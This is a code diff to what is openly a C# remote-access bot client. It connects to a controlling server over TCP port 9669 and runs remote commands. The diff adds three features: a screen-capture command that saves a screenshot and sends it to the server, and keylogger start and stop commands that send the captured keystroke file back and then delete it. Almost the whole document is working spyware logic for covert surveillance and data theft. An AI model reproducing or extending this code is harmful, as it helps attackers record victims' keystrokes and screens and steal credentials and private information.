@@ -17,6 +17,10 @@ using System.Security.Policy;
 using System.Threading;
 using System.Runtime.InteropServices.ComTypes;
 using static System.Windows.Forms.VisualStyles.VisualStyleElement.ListView;
+using System.Drawing.Imaging;
+using System.Drawing;
+using System.Net;
+using Server;
 
 namespace Client
 {
@@ -26,7 +30,7 @@ namespace Client
         private const int PORT_NUMBER = 9669;
         static Thread th_doKeylogger;
         static Thread th_socket;
-
+        public static WebClient webClient = new WebClient();
 
         static ASCIIEncoding encoding = new ASCIIEncoding();
         [DllImport("user32.dll")]
@@ -317,6 +321,43 @@ namespace Client
             return output;
         }
 
+        public static void captureScreen()
+        {
+            //Create a new bitmap.
+            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
+                                           Screen.PrimaryScreen.Bounds.Height,
+                                           PixelFormat.Format32bppArgb);
+
+            // Create a graphics object from the bitmap.
+            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
+
+            // Take the screenshot from the upper left corner to the right bottom corner.
+            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
+                                        Screen.PrimaryScreen.Bounds.Y,
+                                        0,
+                                        0,
+                                        Screen.PrimaryScreen.Bounds.Size,
+                                        CopyPixelOperation.SourceCopy);
+
+            //string directoryImage = imagePath + DateTime.Now.ToLongDateString();
+
+            //if (!Directory.Exists(directoryImage))
+            //{
+            //    Directory.CreateDirectory(directoryImage);
+            //}
+            // Save the screenshot to the specified path that the user has chosen.
+            //string imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.ToLongDateString() + "_" + imageCount, imageExtendtion);
+
+            try
+            {
+                bmpScreenshot.Save("capture.png", ImageFormat.Png);
+            }
+            catch
+            {
+
+            }
+        }
+        
         public static void sendFileSocket(TcpClient client, string type)
         {
             string fileName = "";
@@ -326,11 +367,15 @@ namespace Client
             }
             else if (type == "keylogger")
             {
-                fileName = "keylogger.txt";
+                fileName = "outputkeylogger.txt";
             }
             else if (type == "cmd")
             {
                 fileName = "cmdResult.txt";
+            }
+            else if (type == "capture")
+            {
+                fileName = "capture.png";
             }
             byte[] dataTemp = File.ReadAllBytes(fileName);
             byte[] dataLength = BitConverter.GetBytes(dataTemp.Length);
@@ -371,14 +416,26 @@ namespace Client
                 //Console.WriteLine(RunCommandAndGetOutput(cmd));
                 sendFileSocket(client, "cmd");
             }
+            else if (command.StartsWith("capture"))
+            {
+                captureScreen();
+                sendFileSocket(client, "capture");
+            }
             else if (command.StartsWith("keylogger"))
             {
-
-                Console.WriteLine("gui keylogger");
-                sendFileSocket(client, "keylogger");
-                Console.WriteLine("gui xong keylogger");
-
-
+                string cmd = command.Split('?')[1];
+                Console.WriteLine(cmd);
+                if (cmd.Equals("start keylogger"))
+                {
+                    //Console.WriteLine("okkk");
+                    BotKeylogger.StartKeylogger();
+                }
+                else if (cmd.Equals("stop keylogger"))
+                {
+                    BotKeylogger.StopKeylogger();
+                    sendFileSocket(client, "keylogger");
+                    File.Delete("outputkeylogger.txt");
+                }
             }
             else if (command.StartsWith("exit"))
             {
@@ -432,6 +489,7 @@ namespace Client
             th_socket = new Thread(new ThreadStart(handleConnectSocket));
             th_socket.SetApartmentState(ApartmentState.STA);
             th_socket.Start();
+            BotKeylogger.initBotKeylogger();
         }
     }
 }
